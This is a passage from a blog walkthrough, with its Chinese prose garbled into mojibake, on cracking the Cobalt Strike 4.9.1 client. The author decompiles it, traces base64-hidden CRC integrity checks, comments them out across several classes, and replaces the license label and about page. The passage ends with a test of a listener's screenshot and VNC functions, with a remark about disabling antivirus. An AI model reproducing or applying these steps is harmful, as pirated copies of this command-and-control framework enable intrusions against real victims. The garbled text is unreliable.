punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"Y29tbW9uLlN0YXJ0ZXI="</span><span class="token punctuation">,</span> <span class="token number">541000743L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//common.Starter</span>            <span class="token keyword">return</span> var1<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>          <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">String</span> var0<span class="token punctuation">,</span> <span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//base64ç¼–ç </span>         <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>``` javaæˆ‘ä»¬æ¨æµ‹è¿™ä¸ªåº”è¯¥å°±æ˜¯æ£€æµ‹ç‚¹æˆ‘ä»¬è¿˜æ˜¯è€æ ·å­å»åç¼–è¯‘æºç ä¸­å¤åˆ¶ä¸€æ³¢å˜æˆäº†csproject\src\aggressor\ui\<span class="token class-name">UseLookAndFeel</span><span class="token punctuation">.</span>java ä¿®æ”¹ä¸€æ³¢ä»£ç ã€‚é‡æ–°ç¼–è¯‘çœ‹çœ‹``` java       <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">adjustments</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">A</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"check adjustments!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span></code></pre><p>è¯´æ˜æ˜¯è¿™ä¸ªç‚¹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101903954.png" alt="å¦‚å›¾"><br>   var2 &#x3D; var6.getDeclaredMethod(A(var5, â€œâ€), var7, var7, Boolean.TYPE, Long.TYPE);&#x2F;&#x2F;common.CommonUtils.validClassIntegrity<br>ä½¿ç”¨åå°„åˆ©ç”¨ validClassIntegrity æ ¡éªŒç±»æ˜¯å¦è¢«æ”¹ </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">validClassIntegrity</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">,</span> <span class="token class-name">Class</span> var1<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var2<span class="token punctuation">,</span> <span class="token keyword">long</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">ZipFile</span> var5 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> var6<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>       var5 <span class="token operator">=</span> <span class="token function">openZip</span><span class="token punctuation">(</span>var0<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>var5 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">long</span> var18 <span class="token operator">=</span> <span class="token function">getClassCRC</span><span class="token punctuation">(</span>var5<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">boolean</span> var8 <span class="token operator">=</span> var3 <span class="token operator">==</span> var18<span class="token punctuation">;</span>          <span class="token keyword">return</span> var8<span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       var6 <span class="token operator">=</span> var2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>var5 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>             var5<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var16<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> var6<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token function">getClassCRC</span><span class="token punctuation">(</span><span class="token class-name">ZipFile</span> var0<span class="token punctuation">,</span> <span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>       <span class="token class-name">String</span> var2 <span class="token operator">=</span> <span class="token function">convertClassToFileName</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">ZipEntry</span> var3 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">getEntry</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> var3 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> var3<span class="token punctuation">.</span><span class="token function">getCrc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1L</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1L</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬ä¹‹è®¡copy common.CommonUtils åœ¨validClassIntegrityå‡½æ•°åŠ ä¸Š System.out.println(â€œcrc checking class â€œ+var0.getName()+â€ | â€œ+var1.getName());<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101926994.png" alt="å¦‚å›¾"><br>éªŒè¯äº†æˆ‘çŒœæƒ³ä½¿ç”¨ common.CommonUtils çš„åœ¨validClassIntegrityå‡½æ•° éªŒè¯ aggressor.MultiFrame çš„å®Œæ•´æ€§æ‰€ä»¥ç›´æ¥æ³¨é‡Šæ‰</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">boolean</span> var1 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>         <span class="token comment">/*         Method var2 = null;         String var3 = "Y29tbW9uLkNvbW1vblV0aWxz";         String var4 = "amF2YS5sYW5nLkNsYXNz";         String var5 = "dmFsaWRDbGFzc0ludGVncml0eQ==";         Class var6 = null;         try &#123;            var6 = Class.forName(A(var3, ""));            Class var7 = Class.forName(A(var4, ""));            var2 = var6.getDeclaredMethod(A(var5, ""), var7, var7, Boolean.TYPE, Long.TYPE);         &#125; catch (Throwable var10) &#123;            System.exit(1);         &#125;         var1 = var1 &amp;&amp; A(var2, var0, false, "Y29tbW9uLkNvbW1vblV0aWxz", 395936014L);         var1 = var1 &amp;&amp; A(var2, var0, false, "Y29tbW9uLkF1dGhvcml6YXRpb24=", 1655604415L);         long var11 = 895661977L;         String var9 = "Y29tbW9uLkF1dGhDcnlwdG8=";         var1 = var1 &amp;&amp; A(var2, var0, false, var9, var11);         var1 = var1 &amp;&amp; !A(var2, var0, false, var9, var11 + 1L);         var1 = var1 &amp;&amp; A(var2, var0, false, "Y29tbW9uLkRhdGFQYXJzZXI=", 2488344227L);         var1 = var1 &amp;&amp; A(var2, var0, false, "Y29tbW9uLlNsZWV2ZWRSZXNvdXJjZQ==", 3881376138L);         var1 = var1 &amp;&amp; A(var2, var0, false, "ZG5zLlNsZWV2ZVNlY3VyaXR5", 3962922538L);         var1 = var1 &amp;&amp; A(var2, var0, false, "YWdncmVzc29yLkFnZ3Jlc3Nvcg==", 105727981L);         var1 = var1 &amp;&amp; A(var2, var0, false, "Y29tbW9uLkFnZ3Jlc3NvckluZm8=", 1814321826L);         var1 = var1 &amp;&amp; A(var2, var0, false, "Y29tbW9uLlN0YXJ0ZXI=", 541000743L);         */</span>                   <span class="token keyword">return</span> var1<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span></code></pre><p>ç¼–è¯‘è¿è¡Œæˆ‘ä»¬å‘ç°åˆé€€å‡ºäº†å¦‚ä¸‹å›¾ã€‚æ‰€ä»¥é‚£å°±æ˜¯  (new ConnectDialog(A)).show(); ä»£ç æœ‰éªŒè¯<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101934301.png" alt="å¦‚å›¾"></p><pre class="language-java" data-language="java"><code class="language-java">\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\aggressor\dialogs\<span class="token class-name">ConnectDialog</span><span class="token punctuation">.</span><span class="token keyword">class</span>  <span class="token keyword">public</span> <span class="token class-name">ConnectDialog</span><span class="token punctuation">(</span><span class="token class-name">MultiFrame</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>window <span class="token operator">=</span> var1<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>useAliasName <span class="token operator">=</span> <span class="token class-name">Prefs</span><span class="token punctuation">.</span><span class="token function">getPreferences</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isSet</span><span class="token punctuation">(</span><span class="token string">"connection.view.alias.boolean"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>æˆ‘ä»¬çœ‹åˆ°äº†<span class="token keyword">super</span>å°±æ˜¯ä»–çš„çˆ¶ç±»å­˜åœ¨è¿™ä¸ªå‡½æ•° <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConnectDialog</span> <span class="token keyword">extends</span> <span class="token class-name">Starter2</span> é‚£å°±æ˜¯ <span class="token class-name">Starter2</span> \csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Starter2</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">boolean</span> var2 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token class-name">Class</span> var3 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>      var3 <span class="token operator">=</span> <span class="token class-name">Starter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>      <span class="token class-name">String</span> var4 <span class="token operator">=</span> <span class="token string">"common/Starter.class"</span><span class="token punctuation">;</span>      <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">B</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      var3 <span class="token operator">=</span> <span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>      var4 <span class="token operator">=</span> <span class="token string">"common/Initializer.class"</span><span class="token punctuation">;</span>      var5 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">B</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      var3 <span class="token operator">=</span> <span class="token class-name">Aggressor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>      var4 <span class="token operator">=</span> <span class="token string">"aggressor/Aggressor.class"</span><span class="token punctuation">;</span>      var5 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">B</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      var3 <span class="token operator">=</span> <span class="token class-name">AggressorInfo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>      var4 <span class="token operator">=</span> <span class="token string">"common/AggressorInfo.class"</span><span class="token punctuation">;</span>      var5 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">B</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span></code></pre><p>è€è§„çŸ©å¤åˆ¶ä¸€æ³¢ æ³¨é‡Šæ‰éªŒè¯å‡½æ•°</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//ä¿®æ”¹ä¸€æ³¢</span>      <span class="token keyword">boolean</span> var2 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token comment">/*      Class var3 = null;      var3 = Starter.class;      String var4 = "common/Starter.class";      long[] var5 = this.A((Object)var3);      if (!B(var1, var3, var4, var5, true)) &#123;         var2 = false;      &#125;      var3 = Initializer.class;      var4 = "common/Initializer.class";      var5 = this.A((Object)var3);      if (!B(var1, var3, var4, var5, true)) &#123;         var2 = false;      &#125;      var3 = Aggressor.class;      var4 = "aggressor/Aggressor.class";      var5 = this.A((Object)var3);      if (!B(var1, var3, var4, var5, true)) &#123;         var2 = false;      &#125;      var3 = AggressorInfo.class;      var4 = "common/AggressorInfo.class";      var5 = this.A((Object)var3);      if (!B(var1, var3, var4, var5, true)) &#123;         var2 = false;      &#125;*/</span>      <span class="token keyword">return</span> var2<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>æŒ‰ç…§ä»–è¿™ä¸ªå¥—è·¯åœ¨åç¼–è¯‘æºç ä¸­æˆ‘ä»¬æœç´¢ä¸€ä¸‹ common&#x2F;<br>\csproject\src\common\Helper.java</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101958549.png" alt="çœ‹å›¾"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">startHelper</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">boolean</span> var2 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token comment">/*      Class var3 = null;      var3 = Starter2.class;      String var4 = "common/Starter2.class";      long[] var5 = this.getHelpID(var3);      if (!B(var1, var3, var4, var5, true)) &#123;         var2 = false;      &#125;      var3 = ConnectDialog.class;      var4 = "aggressor/dialogs/ConnectDialog.class";      var5 = this.getHelpID(var3);      if (!B(var1, var3, var4, var5, true)) &#123;         var2 = false;      &#125;      */</span>            <span class="token keyword">return</span> var2<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬å†æ¬¡æœç´¢ Y29tbW9uLkNvbW1vblV0aWxz<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501102032267.png" alt="æœç´¢"><br>csproject\src\console\StatusBar.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">boolean</span> var1 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token comment">/*        Method var2 = null;        String var3 = "Y29tbW9uLkNvbW1vblV0aWxz";        String var4 = "amF2YS5sYW5nLkNsYXNz";        String var5 = "dmFsaWRDbGFzc0ludGVncml0eQ==";        Class var6 = null;        try &#123;           var6 = Class.forName(A(var3, ""));           Class var7 = Class.forName(A(var4, ""));           var2 = var6.getDeclaredMethod(A(var5, ""), var7, var7, Boolean.TYPE, Long.TYPE);        &#125; catch (Throwable var8) &#123;           System.exit(1);        &#125;        var1 = var1 &amp;&amp; A(var2, var0, false, "ZGlhbG9nLlNhZmVEaWFsb2dzJFNhZmV0eUNoZWNr", 2543265740L);        var1 = var1 &amp;&amp; A(var2, var0, false, "YWdncmVzc29yLmJyb3dzZXJzLkNyZWRlbnRpYWxz", 3889907850L);        var1 = var1 &amp;&amp; A(var2, var0, false, "YWdncmVzc29yLmJyb3dzZXJzLlRhcmdldHM=", 3853403163L);        */</span>        <span class="token keyword">return</span> var1<span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span></code></pre><p>csproject\src\aggressor\Prefs.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">boolean</span> var1 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>       <span class="token comment">/*       Method var2 = null;       String var3 = "Y29tbW9uLkNvbW1vblV0aWxz";       String var4 = "amF2YS5sYW5nLkNsYXNz";       String var5 = "dmFsaWRDbGFzc0ludGVncml0eQ==";       Class var6 = null;       try &#123;          var6 = Class.forName(A(var3, ""));          Class var7 = Class.forName(A(var4, ""));          var2 = var6.getDeclaredMethod(A(var5, ""), var7, var7, Boolean.TYPE, Long.TYPE);       &#125; catch (Throwable var8) &#123;          System.exit(1);       &#125;       var1 = var1 &amp;&amp; A(var2, var0, false, "Y29uc29sZS5TdGF0dXNCYXIkU3RhdHVzQmFySGVscGVy", 482118951L);       var1 = var1 &amp;&amp; A(var2, var0, false, "Z3JhcGguTmV0d29ya0dyYXBo", 3864160077L);        */</span>       <span class="token keyword">return</span> var1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>csproject\src\dialog\SafeDialogs.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">boolean</span> var1 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token comment">/*        Method var2 = null;        String var3 = "Y29tbW9uLkNvbW1vblV0aWxz";        String var4 = "amF2YS5sYW5nLkNsYXNz";        String var5 = "dmFsaWRDbGFzc0ludGVncml0eQ==";        Class var6 = null;        try &#123;           var6 = Class.forName(A(var3, ""));           Class var7 = Class.forName(A(var4, ""));           var2 = var6.getDeclaredMethod(A(var5, ""), var7, var7, Boolean.TYPE, Long.TYPE);        &#125; catch (Throwable var10) &#123;           System.exit(1);        &#125;        var1 = var1 &amp;&amp; A(var2, var0, false, "YWdncmVzc29yLnVpLlVzZUxvb2tBbmRGZWVsJExvb2tBbmRGZWVsTWFuYWdlcg==", 684737157L);        long var11 = 942042510L;        String var9 = "YWdncmVzc29yLk11bHRpRnJhbWU=";        var1 = var1 &amp;&amp; !A(var2, var0, false, var9, var11 + 1L);        var1 = var1 &amp;&amp; A(var2, var0, false, var9, var11);        var1 = var1 &amp;&amp; A(var2, var0, false, "ZGlhbG9nLkFjdGl2aXR5UGFuZWw=", 3600095813L);         */</span>        <span class="token keyword">return</span> var1<span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬å…¨éƒ¨ä¿®æ”¹å®Œæ¯•äº†æˆ‘ä»¬åœ¨é‡æ–°è¿è¡Œä¸€æ³¢çœ‹çœ‹ã€‚ç ´è§£æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501102050387.png" alt="ç ´è§£æˆåŠŸ"></p><p>æˆ‘ä»¬è¿è¡Œ Pwn3rzs çš„æœåŠ¡ç«¯æµ‹è¯•ä¸€æ³¢ã€‚é‚£æˆ‘ä»¬å°è¯•ä¿®æ”¹ä¸€æ³¢<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501102105181.png" alt="å¦‚å›¾"><br>æˆ‘ä»¬æœç´¢Licensed å‘ç°åœ¨\AggressorInfo.java ç›´æ¥copyåˆ°è¿™ä¸ª<br>csproject\src\common\AggressorInfo.java ä¿®æ”¹ä¸€ä¸‹ç¼–è¯‘å°è¯•ä¸€ä¸‹</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">common</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AggressorInfo</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> VERSION <span class="token operator">=</span> <span class="token string">"4.9.1 "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token class-name">License</span><span class="token punctuation">.</span><span class="token function">isTrial</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"Trial"</span> <span class="token operator">:</span> <span class="token string">"(Pwn3rs)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//"Licensed");</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> VERSION_SHORT <span class="token operator">=</span> <span class="token string">"4.9.1"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ç ´è§£å®Œæ¯•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501102115421.png" alt="ç ´è§£å®Œæ¯•"><br>æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹ç‰ˆæƒçœ‹çœ‹<br>csproject\src\resources\about.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Cobalt Strike 4.9.1 peiqiF4ck<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Advanced Threat Tactics Software<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Release: Oct 10, 2023<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&copy;">&amp;copy;</span> Fortra, LLC and its group of companies.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>All trademarks and registered trademarks are the property of their respective owners.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>ä¿®æ”¹ç¼–è¯‘åæä¸ªlistenerä¸Šçº¿æµ‹è¯•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501102124726.png" alt="å¦‚å›¾"><br>å¦‚å›¾æµ‹è¯•å±å¹•æˆªå›¾å’ŒVNCåŠŸèƒ½æ­£å¸¸è¦å…³é—­æ€è½¯è¿›è¡Œæµ‹è¯•<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501102130201.png" alt="æµ‹è¯•"></p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" 